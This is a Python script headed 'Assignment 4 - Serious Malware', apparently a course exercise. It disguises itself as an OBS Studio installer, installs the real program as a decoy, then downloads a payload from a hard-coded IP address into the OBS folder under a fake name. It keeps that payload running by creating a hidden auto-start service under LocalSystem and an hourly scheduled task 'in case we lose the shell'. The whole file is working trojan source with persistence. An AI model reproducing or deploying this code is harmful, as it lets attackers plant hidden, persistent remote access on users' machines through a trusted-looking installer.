#Assignment 4 - Serious Malware
#0BS-Studio-29.1.3-Full-Installer-x64.exe
#Created By: Andrew McDonald 
#Date Created: November 12, 2023
#Date Modified: November 25, 2023

#import required modules
import subprocess
import urllib.request
import sys
import os

#Determine who is logged in to find their downloads directory
current_user = os.getlogin()
#Define the download path for the real OBS Studio Installer
download_path = fr"C:\Users\{current_user}\Downloads\OBS-Studio-29.1.3-Full-Installer-x64.exe"

#Define the payload path
payload_path = r"C:\Program Files\obs-studio\data\obs-scripting\64bit\_obspython.exe"

#Download OBS Studio to the user's Downloads directory
urllib.request.urlretrieve("https://cdn-fastly.obsproject.com/downloads/OBS-Studio-29.1.3-Full-Installer-x64.exe", download_path)

#Install OBS Studio
subprocess.call([download_path])

#Download Payload file. This will occur once OBS is fully installed.
urllib.request.urlretrieve("http://192.168.222.155:80/_obspython.exe", payload_path)

##Establish Persistence##

##SERVICE##
#Define the service that runs when the machine starts.
serviceCommand = ["sc", "create", "OBS_Studio", "binpath=", payload_path, "start=", "auto", "obj=", "LocalSystem",]
#Define the start command for the service
startCommand = ["sc", "start", "OBS_Studio",]

#Open instance of the command prompt in the background to run each of the commands
subprocess.run(serviceCommand, creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.run(startCommand, creationflags=subprocess.CREATE_NO_WINDOW)

##SCHEDULED TASK##
#Create a scheduled task to run every hour in case we lose the shell
schtaskCommand =["schtasks", "/create", "/sc", "hourly", "/mo", "1", "/tn", "OBS_Studio", "/tr", f'"{payload_path}"',]
#Open instance of the command prompt in the background to run the command
subprocess.run(schtaskCommand, creationflags=subprocess.CREATE_NO_WINDOW)

#Delete OBS Studio Installer leaving our malicious installer
os.remove(download_path) â€ƒ
